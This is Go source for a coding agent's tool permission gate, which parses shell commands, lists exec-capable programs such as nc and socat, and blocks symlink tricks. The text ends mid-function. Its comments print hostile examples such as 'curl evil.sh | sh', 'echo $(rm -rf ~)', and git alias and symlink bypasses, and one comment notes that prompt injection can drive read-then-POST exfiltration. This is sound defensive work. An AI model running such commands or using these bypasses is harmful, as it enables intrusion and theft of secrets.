// Package tools implements Tapioca's built-in coding tools (shell, file
// read/write/edit) with a permission gate, making agents able to work on a
// codebase without any MCP server.
package tools

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"sort"
	"strings"
	"sync"
	"time"

	"tapioca/internal/config"
	"tapioca/internal/diff"
	"tapioca/internal/provider"
	"tapioca/internal/secretenv"
	"tapioca/internal/textenc"
)

// Decision is the user's answer to a permission request.
type Decision struct {
	Allow  bool
	Always bool   // remember for this tool for the rest of the session
	Prefix string // bash only: always allow commands starting with this word
}

// AskFunc asks the user for permission; it blocks until answered.
type AskFunc func(tool, summary string) Decision

// Permission modes, cycled with shift+tab in the UI.
const (
	ModePlan   = "plan"   // no file modifications; bash asks; agent presents plans
	ModeManual = "manual" // ask for every mutating tool call
	ModeAuto   = "auto"   // file edits auto-approved; bash still asks
	ModeBypass = "bypass" // everything runs without asking
)

// Modes lists the cycle order.
var Modes = []string{ModePlan, ModeManual, ModeAuto, ModeBypass}

// NormalizeMode maps legacy/unknown mode names onto the current set.
func NormalizeMode(m string) string {
	switch m {
	case ModePlan, "readonly":
		return ModePlan
	case ModeAuto:
		return ModeAuto
	case ModeBypass:
		return ModeBypass
	default: // "", "ask", "manual", anything else
		return ModeManual
	}
}

const (
	maxOutput = 30_000
	// defaultExecTimeout caps one tool call; bash_timeout in the config moves
	// it, and a single call may ask for more, up to maxExecTimeout.
	defaultExecTimeout = 3 * time.Minute
	maxExecTimeout     = 30 * time.Minute
)

// Executor runs built-in tools inside a working directory.
type Executor struct {
	mu           sync.Mutex
	cwd          string
	mode         string
	allowed      map[string]bool
	bashPrefixes []string
	extraDirs    []string
	seen         map[string]fileStamp // files the agent has read or written
	sandbox      bool                 // confine bash with bubblewrap
	timeout      time.Duration        // 0 = defaultExecTimeout
	sandboxNet   bool
	diagnose     func(path string) string // language-server check after an edit
	rules        []rule                   // per-tool permission rules from the config
	hooks        []Hook                   // user commands run around tool calls
	jobs         map[string]*job          // background bash, by id
	jobSeq       int
	checkpoint   func(label string)
}

// SetBashPrefixes replaces the always-allowed bash command prefixes.
func (e *Executor) SetBashPrefixes(ps []string) {
	e.mu.Lock()
	e.bashPrefixes = append([]string(nil), ps...)
	e.mu.Unlock()
}

// segments splits a compound command so each part can be approved on its own:
// "ls || pwd" prompts for "ls", then for "pwd".
//
// The split has to respect quoting, because escapes() below tracks quote state
// per segment. Splitting with a regex that ignored quotes meant a separator
// inside a string cut the command in half and left each half with an
// unbalanced quote, so escapes() believed it was inside a string exactly where
// the shell was not: `echo "a|echo b" & touch x` became two segments that both
// looked like a plain echo, and a grant on echo ran the touch.
func segments(command string) []string {
	var out []string
	var cur strings.Builder
	flush := func() {
		if s := strings.TrimSpace(cur.String()); s != "" {
			out = append(out, s)
		}
		cur.Reset()
	}
	// atWordStart tracks what sh tracks: whether the next byte begins a word.
	// Testing the last byte already in the buffer instead was wrong, because
	// an escaped space (`a\ `) leaves a space there while sh is still mid-word
	// — so `echo a\ #x; touch y` took the # for a comment, threw away the
	// rest of the line, and never showed the touch to anyone.
	inSingle, inDouble, atWordStart := false, false, true
	for i := 0; i < len(command); i++ {
		c := command[i]
		switch {
		case c == '\\' && !inSingle:
			cur.WriteByte(c)
			if i+1 < len(command) {
				i++
				cur.WriteByte(command[i])
			}
			atWordStart = false
			continue
		case c == '$' && !inSingle && i+1 < len(command) && command[i+1] == '\'':
			// $'...' quotes with C escapes, where \' does not end the string.
			// Scanning it as a plain single quote desynced everything after.
			cur.WriteByte(c)
			i++
			cur.WriteByte(command[i])
			for i+1 < len(command) {
				i++
				cur.WriteByte(command[i])
				if command[i] == '\\' && i+1 < len(command) {
					i++
					cur.WriteByte(command[i])
					continue
				}
				if command[i] == '\'' {
					break
				}
			}
			atWordStart = false
			continue
		case c == '\'' && !inDouble:
			inSingle = !inSingle
			atWordStart = false
		case c == '"' && !inSingle:
			inDouble = !inDouble
			atWordStart = false
		case !inSingle && !inDouble:
			// A # begins a comment only at the start of a word; sh ends it at
			// the newline.
			if c == '#' && atWordStart {
				for i < len(command) && command[i] != '\n' {
					i++
				}
				flush()
				atWordStart = true
				continue
			}
			if c == ';' || c == '\n' {
				flush()
				atWordStart = true
				continue
			}
			if c == '|' || c == '&' {
				// || and && are one separator; a single | is a pipe, and a
				// single & is left in place for escapes() to flag.
				if i+1 < len(command) && command[i+1] == c {
					i++
				} else if c == '&' {
					break
				}
				flush()
				atWordStart = true
				continue
			}
			// Unquoted whitespace is what actually ends a word.
			atWordStart = isSpace(c)
			cur.WriteByte(c)
			continue
		}
		atWordStart = false
		cur.WriteByte(c)
	}
	flush()
	return out
}

func isSpace(b byte) bool { return b == ' ' || b == '\t' }

func (e *Executor) wordAllowed(word string) bool {
	if word == "" {
		return false // a segment with no literal command name matches nothing
	}
	e.mu.Lock()
	defer e.mu.Unlock()
	for _, p := range e.bashPrefixes {
		if word == p {
			return true
		}
	}
	return false
}

// escapes reports shell constructs that make a segment's first word a poor
// summary of what will run: substitution executes other programs, redirection
// writes files, and a lone & chains a second command that segments() cannot
// see. Granting "echo" must not silently grant "echo $(rm -rf ~)",
// "echo x > main.go" or "echo hi & curl evil.com".
func escapes(segment string) bool {
	if strings.Contains(segment, "$(") || strings.Contains(segment, "`") ||
		strings.Contains(segment, "${") || strings.Contains(segment, "<(") ||
		// $'...' follows C escaping rules the scanner below does not model, so
		// $'\'' closes the quote where the scanner thinks one opens.
		strings.Contains(segment, "$'") {
		return true
	}
	// An expansion in the first word means the first word is not the program:
	// touch$IFS/x and $CMD both run something the summary does not name.
	if f := strings.Fields(segment); len(f) > 0 && strings.Contains(f[0], "$") {
		return true
	}
	inSingle, inDouble := false, false
	for i := 0; i < len(segment); i++ {
		switch c := segment[i]; c {
		case '\\':
			// sh takes backslash literally inside single quotes, so consuming
			// the next byte there desynced the scanner: 'x\' hid the closing
			// quote and everything after it read as quoted, so the redirect in
			// `echo 'x\' > ~/.bashrc` went unnoticed.
			if !inSingle {
				i++
			}
		case '\'':
			if !inDouble {
				inSingle = !inSingle
			}
		case '"':
			if !inSingle {
				inDouble = !inDouble
			}
		case '>', '<', '&':
			if !inSingle && !inDouble {
				return true
			}
		}
	}
	return false
}

// segmentAllowed reports whether a granted word covers this exact segment.
func (e *Executor) segmentAllowed(segment string) bool {
	if escapes(segment) || usesExecFlag(segment) {
		return false
	}
	return e.wordAllowed(PrefixSuggestion(segment))
}

// ExternalAllowed reports whether an externally-provided tool (MCP) may run
// without asking. Plan mode ignores grants, like the builtin gate.
func (e *Executor) ExternalAllowed(key string) bool {
	e.mu.Lock()
	defer e.mu.Unlock()
	if e.mode == ModeBypass {
		return true
	}
	return e.mode != ModePlan && e.allowed[key]
}

// GrantExternal records an always-allow for an external tool key.
func (e *Executor) GrantExternal(key string) {
	e.mu.Lock()
	e.allowed[key] = true
	e.mu.Unlock()
}

// Grants reports the session's always-allowed tools and bash words.
func (e *Executor) Grants() (tools []string, bashWords []string) {
	e.mu.Lock()
	defer e.mu.Unlock()
	for t, ok := range e.allowed {
		if ok {
			tools = append(tools, t)
		}
	}
	sort.Strings(tools)
	return tools, append([]string(nil), e.bashPrefixes...)
}

// execCapable lists commands that take "run this program" as an argument, so
// a blanket grant on the name alone is a grant of everything the shell can do.
// It is not only interpreters: an exec flag is enough, and each of these was
// checked to run a command with output on a pipe rather than a terminal.
//
// Being a list of names, this cannot be complete — a command nobody here
// thought of will have its own exec flag. It only decides whether the [p]
// shortcut is *offered*; [y] and [a] still allow the exact command, and the
// permission mode, not this map, is the boundary that has to hold.
var execCapable = map[string]bool{
	// Shells and language runtimes: code from an argument or stdin.
	"sh": true, "bash": true, "zsh": true, "fish": true, "dash": true,
	"ksh": true, "csh": true, "tcsh": true, "pwsh": true, "nu": true,
	"python": true, "python3": true, "perl": true, "ruby": true, "node": true,
	"deno": true, "bun": true, "php": true, "lua": true, "tclsh": true,
	"awk": true, "gawk": true, "mawk": true, "sed": true,
	"rscript": true, "julia": true, "osascript": true, "expect": true,
	"runghc": true, "runhaskell": true, "ghci": true, "irb": true,
	"elixir": true, "iex": true, "erl": true, "escript": true,
	"java": true, "mono": true, "dotnet": true, "scala": true, "groovy": true,
	"jshell": true, "sbcl": true, "clisp": true, "guile": true, "racket": true,
	// Builtins that run their argument as a command.
	"eval": true, "exec": true, "command": true, "builtin": true,
	"source": true, ".": true,
	// Wrappers: everything after the flags is the program to run.
	"env": true, "xargs": true, "nohup": true, "setsid": true, "timeout": true,
	"time": true, "nice": true, "ionice": true, "stdbuf": true, "watch": true,
	"parallel": true, "flock": true, "script": true, "entr": true,
	"unshare": true, "nsenter": true, "setarch": true, "taskset": true,
	"chrt": true, "capsh": true, "runuser": true, "systemd-run": true,
	"sudo": true, "doas": true, "su": true, "chroot": true, "busybox": true,
	// Remote and container execution.
	"ssh": true, "scp": true, "sftp": true, "socat": true,
	"nc": true, "ncat": true, "netcat": true,
	"docker": true, "podman": true, "nerdctl": true, "kubectl": true,
	"helm": true, "vagrant": true, "ansible": true, "ansible-playbook": true,
	"nix-shell": true, "nix": true, "npx": true,
	// Editors, pagers and debuggers shell out from a keystroke or a flag.
	"vi": true, "vim": true, "nvim": true, "emacs": true, "ed": true,
	"less": true, "more": true, "most": true, "man": true,
	"gdb": true, "lldb": true, "strace": true, "ltrace": true, "perf": true,
	"valgrind": true,
	// Database clients with a shell escape: sqlite3 .shell, psql \!.
	"sqlite3": true, "psql": true, "mysql": true,
}

// runsOtherPrograms matches path and version variants too: /usr/bin/python3,
// python3.11 and bash-5.2 are the same grant as their bare name.
func runsOtherPrograms(word string) bool {
	base := strings.ToLower(filepath.Base(word))
	if execCapable[base] {
		return true
	}
	trimmed := strings.TrimRight(base, "0123456789.-")
	return trimmed != base && execCapable[trimmed]
}

// execFlags are flags that turn an ordinary command into a way of running
// another program named in the arguments. The command itself stays grantable —
// "git status" and "go test ./..." are the reason the shortcut exists — but a
// grant covers the command doing its normal job, never one of these. They are
// checked when the grant is matched, not only when it is offered, because the
// point of a blanket grant is that later commands are not read by anyone.
//
// git -c alias.x='!cmd' x was verified to run with output on a pipe; git's
// pager needs a terminal and cannot be reached this way.
var execFlags = map[string][]string{
	"git": {"-c", "--config-env", "--exec-path", "--upload-pack", "--receive-pack",
		// Verified to run a program with output on a pipe: `git rebase -x`,
		// `git difftool -y -x` / `--extcmd`, and filter-branch's filters.
		"-x", "--exec", "--extcmd", "--to-command", "--smtp-server",
		"--tree-filter", "--index-filter", "--parent-filter", "--msg-filter",
		"--commit-filter", "--tag-name-filter", "--env-filter"},
	"find": {"-exec", "-execdir", "-ok", "-okdir"},
	// -toolexec runs its argument around every compiler invocation, which
	// `go build` alone reaches; run and generate are not the only two.
	"go":     {"run", "generate", "-toolexec", "-exec", "-vettool"},
	"cargo":  {"run"},
	"npm":    {"exec"},
	"yarn":   {"exec"},
	"pnpm":   {"exec"},
	"make":   {"-f", "--file", "--makefile", "--eval"},
	"cmake":  {"-P", "-E"},
	"tar":    {"-I", "--use-compress-program", "--to-command"},
	"rsync":  {"-e", "--rsh", "--rsync-path"},
	"zip":    {"-TT", "--unzip-command"},
	"gcc":    {"-wrapper", "-fplugin"},
	"clang":  {"-fplugin"},
	"ffmpeg": {"-f"},
}

// execSubcommands are subcommands whose whole job is to run a program the
// caller names, so no flag has to be spotted for the grant to be worthless:
// `git bisect run <cmd>`, `git submodule foreach <cmd>`, and difftool and
// mergetool, which take theirs from config the repository may have written.
//
// This list and execFlags above are both lists, and a blanket grant on git is
// weaker than either can make it look: `git commit` runs .git/hooks/pre-commit,
// which in an extracted tarball is a file the archive chose. What they buy is
// that the command a user pressed [p] on cannot be turned into an arbitrary one
// by adding a flag to it — not that git in a hostile tree is safe.
//
// `config` is there for what it writes rather than what it runs: `git config
// --global alias.st '!touch x'` followed by `git st` is arbitrary execution
// out of one grant on git, and the same write reaches core.fsmonitor,
// core.hooksPath, core.sshCommand and credential.helper — all of which run a
// program the next time git is used, in any repository, after this session has
// ended. `git -c` was already refused for exactly this; leaving the persistent
// spelling open made that refusal a formality. It costs a prompt on `git config
// --get`, which is a read, and that is the cheaper mistake.
var execSubcommands = map[string][]string{
	"git": {"bisect", "filter-branch", "difftool", "mergetool", "submodule",
		"send-email", "p4", "svn", "daemon", "instaweb", "web--browse", "help",
		"config"},
}

// valueOptions take the next word as their value, so that word is not the
// subcommand. -c and --exec-path are absent on purpose: they are exec flags, so
// the segment is already refused before the subcommand matters.
var valueOptions = map[string]bool{
	"-C": true, "--git-dir": true, "--work-tree": true,
	"--namespace": true, "--super-prefix": true,
}

// firstSubcommand returns a segment's first non-option word — its subcommand —
// and the index just past it. Only the first is looked at: matching the name
// anywhere would refuse `git commit -m "fix submodule"`.
func firstSubcommand(words []string) (string, int) {
	for i := 0; i < len(words); i++ {
		w := unquoteWord(words[i])
		if strings.HasPrefix(w, "-") || (i > 0 && valueOptions[unquoteWord(words[i-1])]) {
			continue
		}
		return w, i + 1
	}
	return "", 0
}

// runsExecSubcommand reports whether a segment reaches for a way of running a
// program that belongs to its subcommand rather than to a flag.
func runsExecSubcommand(name string, words []string) bool {
	sub, rest := firstSubcommand(words)
	if sub == "" {
		return false
	}
	// `go env -w GOFLAGS=-toolexec=…` writes that flag into the user's own go
	// env file, so every later go command on the machine runs the named
	// program — in any directory, long after the session that was granted.
	// Only with -w: `go env GOPATH` is a read, and -w on its own is far too
	// common a flag to refuse, since `go build -ldflags "-w -s"` carries one.
	if name == "go" && sub == "env" {
		for _, w := range words[rest:] {
			if w := unquoteWord(w); w == "-w" || w == "--w" {
				return true
			}
		}
	}
	for _, s := range execSubcommands[name] {
		if sub == s {
			return true
		}
	}
	return false
}

// expandsWord reports whether the shell will rewrite a word before the command
// sees it: a substitution, a glob, a brace list, a leading tilde, or bash's
// ANSI-C and locale quoting. Quoting is tracked, so a star inside single
// quotes is a literal star.
//
// Reading such a word is not possible, and unquoting it is not enough. Both
// `git $"-c" alias.p='!touch /tmp/pwned' p` and — in a directory holding a file
// the repository named "-c" — `git -? alias.p='!touch /tmp/pwned' p` reach git
// as `git -c`, while spelling themselves as something the scan below does not
// recognise. A blanket grant on git covered them.
func expandsWord(w string) bool {
	inSingle, inDouble := false, false
	for i := 0; i < len(w); i++ {
		switch c := w[i]; c {
		case '\\':
			if !inSingle {
				i++ // the next byte is literal, whatever it is
			}
		case '\'':
			if !inDouble {
				inSingle = !inSingle
			}
		case '"':
			if !inSingle {
				inDouble = !inDouble
			}
		case '$', '`':
			if !inSingle {
				return true // double quotes do not stop substitution
			}
		case '*', '?', '[', '{':
			if !inSingle && !inDouble {
				return true
			}
		case '~':
			if i == 0 && !inSingle && !inDouble {
				return true
			}
		}
	}
	return false
}

// tildeHead strips a leading ~ expansion — ~, ~user, ~+, ~- — up to and
// including the first '/'.
//
// A tilde is an expansion, but a uniquely readable one: it replaces the part
// of the word before that first '/' with a directory path, so the last
// component of the word is untouched and the result can never begin with a
// '-'. Both callers of expandsWord are asking "can I tell what this word
// becomes", and for a tilde the answer is yes. Treating it like $ and * was
// what made `~/go/bin/golangci-lint run` an unreadable command — so a deny
// rule about rm refused it — and what made `go build -o ~/bin/app ./...` look
// like it was reaching for an exec flag, so no [p] grant on go covered it.
//
// A ~ with no '/' after it is a home directory rather than a path into one:
// its last component is not the word's, so it is left alone.
func tildeHead(w string) string {
	if !strings.HasPrefix(w, "~") {
		return w
	}
	if i := strings.IndexByte(w, '/'); i > 0 {
		return w[i+1:]
	}
	return w
}

// usesExecFlag reports whether a segment reaches for one of its command's
// exec flags. Words are unquoted first, since git '-c' is git -c, and a word
// the shell would expand counts as reaching for one: what it becomes is not
// knowable here, and the answer has to be the safe one.
func usesExecFlag(segment string) bool {
	f := strings.Fields(segment)
	if len(f) == 0 {
		return false
	}
	name := strings.ToLower(filepath.Base(unquoteWord(f[0])))
	if runsExecSubcommand(name, f[1:]) {
		return true
	}
	flags, ok := execFlags[name]
	if !ok {
		return false
	}
	for _, w := range f[1:] {
		if expandsWord(tildeHead(w)) {
			return true
		}
		w = unquoteWord(w)
		for _, fl := range flags {
			// A flag written with two dashes is the same flag: Go's flag
			// package, which every `go` subcommand uses, accepts --toolexec for
			// -toolexec, and `go build --toolexec=x ./...` was verified to run
			// x. Matching the spelling in the list only made it a list of
			// spellings rather than of flags.
			if matchesFlag(w, fl) || (strings.HasPrefix(w, "--") && matchesFlag(w[1:], fl)) {
				return true
			}
		}
	}
	return false
}

// matchesFlag reports whether a word is a flag, either bare or carrying its
// value after an '='.
func matchesFlag(w, flag string) bool {
	return w == flag || strings.HasPrefix(w, flag+"=")
}

// grantableWord reports whether w is a literal command name. A blanket grant
// is stored as one word and matched by exact equality, so anything a shell
// would have to interpret before it becomes a command name cannot be granted:
// "FOO=1 bash -c x" offered a grant on "FOO=1", which then cleared every
// command written with that assignment in front, and quoting the name at all
// ("'b'ash") walked past the exec-capable check while still running the shell.
func grantableWord(w string) bool {
	if w == "" || w == "." || w == ".." {
		return false
	}
	for i := 0; i < len(w); i++ {
		c := w[i]
		switch {
		case c >= 'a' && c <= 'z', c >= 'A' && c <= 'Z', c >= '0' && c <= '9':
		case c == '_' || c == '-' || c == '.' || c == '+' || c == '/':
		default:
			return false
		}
	}
	return w[0] != '-'
}

// PrefixSuggestion returns the word an always-allow-prefix grant would use,
// or "" when a blanket grant for it would be meaningless or unsafe. It is used
// for matching as well as for offering, so a command that cannot be reduced to
// a literal name never matches a grant.
func PrefixSuggestion(command string) string {
	f := strings.Fields(command)
	if len(f) == 0 || !grantableWord(f[0]) {
		return ""
	}
	return f[0]
}

// PrefixGrantable reports whether [p] should be offered for a segment.
func PrefixGrantable(segment string) bool {
	w := PrefixSuggestion(segment)
	return w != "" && !runsOtherPrograms(w) && !usesExecFlag(segment) && !escapes(segment)
}

// SetCheckpoint registers a hook run before every mutating tool call.
func (e *Executor) SetCheckpoint(fn func(label string)) {
	e.mu.Lock()
	e.checkpoint = fn
	e.mu.Unlock()
}

// SetExtraDirs records additional directories announced to the model.
func (e *Executor) SetExtraDirs(dirs []string) {
	e.mu.Lock()
	e.extraDirs = dirs
	e.mu.Unlock()
}

// ExtraDirs returns the additional announced directories.
func (e *Executor) ExtraDirs() []string {
	e.mu.Lock()
	defer e.mu.Unlock()
	return e.extraDirs
}

// NewExecutor creates an executor rooted at cwd.
func NewExecutor(cwd, mode string) *Executor {
	return &Executor{cwd: cwd, mode: NormalizeMode(mode), allowed: map[string]bool{}}
}

// SetMode switches the permission mode.
func (e *Executor) SetMode(mode string) {
	e.mu.Lock()
	e.mode = NormalizeMode(mode)
	e.mu.Unlock()
}

// Cwd returns the current working directory.
func (e *Executor) Cwd() string {
	e.mu.Lock()
	defer e.mu.Unlock()
	return e.cwd
}

// SetCwd changes the working directory; the path must exist.
func (e *Executor) SetCwd(dir string) error {
	info, err := os.Stat(dir)
	if err != nil {
		return err
	}
	if !info.IsDir() {
		return fmt.Errorf("%s is not a directory", dir)
	}
	e.mu.Lock()
	e.cwd = dir
	e.mu.Unlock()
	return nil
}

// Mode returns the permission mode.
func (e *Executor) Mode() string {
	e.mu.Lock()
	defer e.mu.Unlock()
	return e.mode
}

var toolNames = []string{"bash", "bash_output", "bash_kill", "read_file", "write_file", "edit_file", "grep", "glob", "web_search", "web_fetch"}

// Has reports whether name is a built-in tool.
func (e *Executor) Has(name string) bool {
	for _, t := range toolNames {
		if t == name {
			return true
		}
	}
	return false
}

// Tools returns the tool definitions offered to models.
func (e *Executor) Tools() []provider.ToolDef {
	return []provider.ToolDef{
		{
			Name:        "bash",
			Description: "Run a shell command in the working directory and return its combined output. Use for builds, tests, git, search, etc.",
			InputSchema: json.RawMessage(`{"type":"object","properties":{"command":{"type":"string","description":"The shell command to run"},"timeout":{"type":"integer","description":"seconds to allow; use for long builds or test suites"},"background":{"type":"boolean","description":"start it and return immediately; poll with bash_output"}},"required":["command"]}`),
		},
		{
			Name:        "read_file",
			Description: "Read a file (absolute path or relative to the working directory). Returns the file content.",
			InputSchema: json.RawMessage(`{"type":"object","properties":{"path":{"type":"string"},"offset":{"type":"integer","description":"1-based line to start from"},"limit":{"type":"integer","description":"max lines to return"}},"required":["path"]}`),
		},
		{
			Name:        "write_file",
			Description: "Create or overwrite a file with the given content. Parent directories are created.",
			InputSchema: json.RawMessage(`{"type":"object","properties":{"path":{"type":"string"},"content":{"type":"string"}},"required":["path","content"]}`),
		},
		{
			Name:        "edit_file",
			Description: "Replace an exact string in a file. old_string must match exactly and be unique unless replace_all is true.",
			InputSchema: json.RawMessage(`{"type":"object","properties":{"path":{"type":"string"},"old_string":{"type":"string"},"new_string":{"type":"string"},"replace_all":{"type":"boolean"}},"required":["path","old_string","new_string"]}`),
		},
		{
			Name:        "bash_output",
			Description: "Collect new output from a background bash job, and whether it is still running. Call with no id to list jobs.",
			InputSchema: json.RawMessage(`{"type":"object","properties":{"id":{"type":"string","description":"job id from bash; omit to list"}}}`),
		},
		{
			Name:        "bash_kill",
			Description: "Stop a background bash job.",
			InputSchema: json.RawMessage(`{"type":"object","properties":{"id":{"type":"string"}},"required":["id"]}`),
		},
		{
			Name:        "grep",
			Description: "Search file contents by regular expression. Prefer this over bash grep: it is faster, skips ignored and binary files, and returns file:line:text. Optionally restrict to a subtree with path or to filenames with glob.",
			InputSchema: json.RawMessage(`{"type":"object","properties":{"pattern":{"type":"string","description":"regular expression"},"path":{"type":"string","description":"directory or file to search, default the working directory"},"glob":{"type":"string","description":"only search files matching this glob, e.g. *.go"},"case_insensitive":{"type":"boolean"},"max_results":{"type":"integer","description":"default 100"}},"required":["pattern"]}`),
		},
		{
			Name:        "glob",
			Description: "Find files by glob pattern (** spans directories; a pattern without / searches everywhere). Returns paths most recently modified first. Prefer this over bash find or ls.",
			InputSchema: json.RawMessage(`{"type":"object","properties":{"pattern":{"type":"string","description":"e.g. **/*_test.go or *.md"},"path":{"type":"string","description":"root to search, default the working directory"}},"required":["pattern"]}`),
		},
		{
			Name:        "web_search",
			Description: "Search the web. Returns result titles, URLs and snippets. Use web_fetch to read a result.",
			InputSchema: json.RawMessage(`{"type":"object","properties":{"query":{"type":"string"},"max_results":{"type":"integer","description":"1-10, default 5"}},"required":["query"]}`),
		},
		{
			Name:        "web_fetch",
			Description: "Fetch a URL and return its readable text content.",
			InputSchema: json.RawMessage(`{"type":"object","properties":{"url":{"type":"string"}},"required":["url"]}`),
		},
	}
}

// resolve turns a tool argument into the absolute path the call will actually
// touch. Symlinks are followed, because every boundary check downstream —
// inWorkArea, sensitivePath, the write gate — compares strings: a link
// committed to a repository (git stores them) named docs -> /home/you made
// write_file("docs/.ssh/authorized_keys") look like an in-tree edit and auto
// mode approved it without asking.
func (e *Executor) resolve(path string) string {
	if strings.HasPrefix(path, "~/") {
		if home, err := os.UserHomeDir(); err == nil {
			path = filepath.Join(home, path[2:])
		}
	}
	if !filepath.IsAbs(path) {
		path = filepath.Join(e.Cwd(), path)
	}
	return realPath(filepath.Clean(path))
}

// realPath resolves symlinks as far as the path exists. A file being created
// does not exist yet, so the deepest existing parent is resolved instead and
// the remainder appended — writing a new file through a symlinked directory
// still lands where the link points, and the check has to see that.
//
// EvalSymlinks fails for a path that does not exist *and* for a symlink whose
// target does not exist, and treating those alike was a hole: a link committed
// as notes.txt -> ~/.ssh/authorized_keys resolved to itself, read as in-tree,
// and auto mode wrote through it without asking. Dangling links are followed
// by hand for that reason. Most interesting targets — authorized_keys,
// .bash_profile, a systemd unit — do not exist yet, so "the target is missing"
// was barely a constraint at all.
func realPath(clean string) string {
	const maxLinks = 40
	rest := ""
	for i := 0; i < maxLinks; i++ {
		if real, err := filepath.EvalSymlinks(clean); err == nil {
			return filepath.Join(real, rest)
		}
		if target, err := os.Readlink(clean); err == nil {
			if !filepath.IsAbs(target) {
				target = filepath.Join(filepath.Dir(clean), target)
			}
			clean = filepath.Clean(target)
			continue
		}
		parent := filepath.Dir(clean)
		if parent == clean {
			return filepath.Join(clean, rest)
		}
		rest = filepath.Join(filepath.Base(clean), rest)
		clean = parent
	}
	// Out of budget: a cycle, or a chain built to exhaust it. Returning the
	// lexical path here approved a location the kernel would not have gone to,
	// so it fails closed instead — unresolvable never lies inside a work area
	// and never matches a rule.
	return unresolvable
}

// unresolvable is the answer when a path cannot be resolved. It contains a NUL,
// so no real path equals it and every containment check says no.
const unresolvable = "\x00unresolvable"

// argPath pulls the "path" argument out of a tool call, or "" when there is
// none — an unparsable call resolves to the working directory and so counts as
// inside it, which is the safe direction (it still goes through the gate).
func argPath(raw json.RawMessage) string {
	var a struct {
		Path string `json:"path"`
	}
	_ = json.Unmarshal(raw, &a)
	return a.Path
}

// plain lifts a tool that produces no display detail into a Result.
func plain(text string, isErr bool, err error) (Result, error) {
	return Result{Text: text, IsErr: isErr}, err
}

// FileChange describes an edit for display. It never reaches the model: the
// model wrote the change and does not need it echoed back at token cost.
type FileChange struct {
	Path    string
	Ops     []diff.Op
	Added   int
	Removed int
	Created bool
}

// Result is a tool call's outcome, including display-only detail.
type Result struct {
	Text   string
	IsErr  bool
	Change *FileChange
}

// Call executes a built-in tool. It returns (result, isError, err); err is
// reserved for internal failures, tool-level problems are (msg, true, nil).
func (e *Executor) Call(ctx context.Context, name string, raw json.RawMessage, ask AskFunc) (string, bool, error) {
	res, err := e.CallDetailed(ctx, name, raw, ask)
	return res.Text, res.IsErr, err
}

// ApproveExternal decides a call for a tool Tapioca does not implement: an MCP
// server's, or one an external ACP agent is about to run in its own process.
// There is no path or command to match on, so the rules see the raw arguments,
// and the key carries where the tool came from — a grant for one server's
// delete must not cover another's.
func (e *Executor) ApproveExternal(key, args string, ask AskFunc) (denial string, allowed bool) {
	act := e.ruleFor(key, args)
	if act == RuleDeny {
		out, _, _ := deniedByRule(key)
		return out, false
	}
	// A rule that says ask outranks an earlier "always allow".
	if act != RuleAsk && e.ExternalAllowed(key) {
		return "", true
	}
	d := ask(key, args)
	if !d.Allow {
		return deniedByUser, false
	}
	if d.Always && act != RuleAsk {
		e.GrantExternal(key)
	}
	return "", true
}

// Approve decides whether a call may happen, without running it: the rules, the
// mode, the session grants and every prompt they imply. Split out of the call
// it normally precedes because the decision is worth having on its own to a
// caller that does not do the work here — an external agent over ACP asks
// before it acts in its own process, and it has to answer to this gate rather
// than to a second one written to be lenient. It reports the refusal to hand
// back to the model.
func (e *Executor) Approve(name string, raw json.RawMessage, ask AskFunc) (denial string, allowed bool) {
	// A configured rule outranks everything, including bypass: "run whatever
	// you like except this" is the point of writing one down. bash is the
	// exception, judged segment by segment further down.
	act := ruleNone
	if name != "bash" {
		act = e.ruleFor(name, subjectOf(name, raw))
		if act == RuleDeny {
			out, _, _ := deniedByRule(name)
			return out, false
		}
	}
	// Read-only tools skip the mutation gate, but two of them compose into
	// exfiltration (read a secret, POST it to a URL), and prompt injection
	// from fetched pages or repo files can drive exactly that. So they get
	// their own narrow checks below.
	if out, _, handled := e.gateReadOnly(name, raw, ask); handled {
		return out, false
	}
	if act == RuleAsk && !mutates(name) {
		// Nothing else would have prompted for these, so the rule is the only
		// thing standing between the model and the call.
		if d := ask(name, e.summary(name, raw)); !d.Allow {
			return deniedByUser, false
		}
	}
	if mutates(name) { // mutating tools go through the permission gate
		mode := e.Mode()
		fileEdit := name == "write_file" || name == "edit_file"
		// "Auto-approve edits" means edits to the project. A write to
		// ~/.zshrc, ~/.ssh/authorized_keys or Tapioca's own config (which
		// seeds bash_allow) is a different act and always asks.
		outside := fileEdit && !e.inWorkArea(e.resolve(argPath(raw)))
		needAsk := false
		switch mode {
		case ModePlan:
			if fileEdit {
				return "denied: plan mode is active — do not modify files; present a plan instead", false
			}
			needAsk = true // bash still allowed for read-only inspection, but asks
		case ModeManual:
			needAsk = true
		case ModeAuto:
			needAsk = !fileEdit || outside
		case ModeBypass:
			needAsk = false
		}
		switch act {
		case RuleAsk:
			needAsk = true
		case RuleAllow:
			// An allow rule is a standing grant, and like the answered kind it
			// does not outrank plan mode.
			if mode != ModePlan {
				needAsk = false
			}
		}
		// Grants never outrank plan mode: an always-allow answered while in
		// auto must not let mutations slip through a later plan session.
		grantsApply := mode != ModePlan
		outsideKey := "write:" + e.resolve(argPath(raw))
		e.mu.Lock()
		// A blanket "always allow write_file" covers the worktree only; each
		// path beyond it is granted on its own.
		blanket := grantsApply && e.allowed[name] && !outside
		if outside && grantsApply && e.allowed[outsideKey] {
			blanket = true
		}
		e.mu.Unlock()
		if act == RuleAsk {
			blanket = false // a rule that says ask outranks an earlier "always allow"
		}
		if name == "bash" {
			// Compound commands are approved segment by segment; a denied
			// segment blocks the whole command. Rules are matched per segment
			// and in every mode: against the whole string "go test*" would
			// also match "go test ./... && curl evil.sh | sh", and a denial
			// has to hold under bypass or it is not a denial.
			var a struct {
				Command string `json:"command"`
			}
			if json.Unmarshal(raw, &a) == nil && strings.TrimSpace(a.Command) != "" {
				segs := segments(a.Command)
				acts := make([]string, len(segs))
				for i, seg := range segs {
					acts[i] = e.ruleFor(name, seg)
					if acts[i] == RuleDeny {
						out, _, _ := deniedByRule(name)
						return out + ": " + seg, false
					}
				}
				for i, seg := range segs {
					if acts[i] != RuleAsk {
						// An allow rule is a standing grant and gets exactly
						// what an answered one gets: not in plan mode, and not
						// for a segment carrying a substitution or a redirect.
						// Skipping escapes() here let allow = ["bash(go test*)"]
						// run `go test $(curl evil.sh -o /tmp/p)` unprompted.
						if acts[i] == RuleAllow && grantsApply && !escapes(seg) {
							continue
						}
						if blanket || !needAsk {
							continue
						}
						if grantsApply && e.segmentAllowed(seg) {
							continue
						}
					}
					d := ask(name, seg)
					if !d.Allow {
						return "the user denied permission for: " + seg, false
					}
					if d.Prefix != "" {
